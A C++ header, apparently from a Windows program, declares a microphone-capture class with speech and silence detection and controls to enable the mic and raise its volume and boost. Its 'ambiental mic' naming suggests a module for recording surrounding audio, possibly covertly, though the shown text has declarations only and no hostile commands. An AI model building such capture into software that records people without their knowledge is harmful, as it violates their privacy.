#pragma once

#include <Mmdeviceapi.h>
#include <Endpointvolume.h>
#include <Audioclient.h>
#include <devicetopology.h>
#include <time.h>
#include "QSpeechDetect.h"

extern BOOL bAmbientalMicSemaphore;

// REFERENCE_TIME time units per second and per millisecond
#define REFTIMES_PER_SEC  10000000
#define REFTIMES_PER_MILLISEC  10000

#define EXIT_ON_ERROR(hres)  \
	if (FAILED(hres)) { goto Exit; }

#define SAFE_RELEASE(punk)  \
	if ((punk) != NULL)  \
{ (punk)->Release(); (punk) = NULL; }

#define CANCELLATION_POINT_DELETE(x, obj) if(x) { x=FALSE; if(obj){ delete obj; obj = NULL; } ExitThread(0); }

#define SAMPLES ((uAudioBufferSize ? uAudioBufferSize : 1) / wfx.nChannels) / (wfx.wBitsPerSample / 8)
#define SHORT_MAX 32767
#define SHORT_MIN -32768
#define CLIP_THRESHOLD 1000
#define SILENCE_THRESHOLD 600

class QVistaMicrophone{
	private:
		SYSTEMTIME st;
		WAVEFORMATEX wfx;
		HRESULT hr;
		BOOL bCalibrate, bMicInitialization, bSilence, bMute, bVolume, bVoice;
		FLOAT fMin, fMax, fStep, fVolume, fLevel, fVoiceThreshold;
		UINT uChunkLen, uAudioBufferSize, uChannels;
		INT iSilenceBlock, iSilenceLength;
		PBYTE pAudioBuffer;

		QSpeechDetect *qsd;
		IMMDeviceEnumerator *pEnumerator;
		IMMDevice *pDevice;
		IAudioClient *pAudioClient;
		IAudioCaptureClient *pCaptureClient;
		IAudioEndpointVolume *pAudio;

	private:
		BOOL InitMic();
		BOOL IsInitialized();
		BOOL AcquireMic();
		BOOL CalibrateMic();
		BOOL StepUp();
		BOOL StepDown();

	public:
		// Sono pubbliche perche' vanno chiamate da dentro un thread, ma NON vanno
		// chiamate da chi utilizza l'oggetto
		//BOOL WaveWrite(PBYTE data, UINT uLen, BOOL bAppend);
		QVistaMicrophone(BOOL bCalibration, UINT uThreshold, INT iSilence);
		~QVistaMicrophone();

		SYSTEMTIME GetTimeStamp();
		BOOL Silent();
		BOOL IsVoice();
		BOOL StartCapture();
		BOOL StopCapture();
		BOOL AcquireMic(PBYTE* pBuffer);
		BOOL EnableMic();
		BOOL DisableMic();
		UINT GetVolume();
		BOOL SetVolume(UINT uVolume);
		BOOL GetBoost();
		BOOL EnableBoost();
		BOOL DisableBoost();
		INT GetBoostGain();
		BOOL SetBoostGain(INT iGain);
		UINT GetBufferSize();
		BOOL MiniSleep(UINT uMilliSec);
		UINT GetSampleRate();
};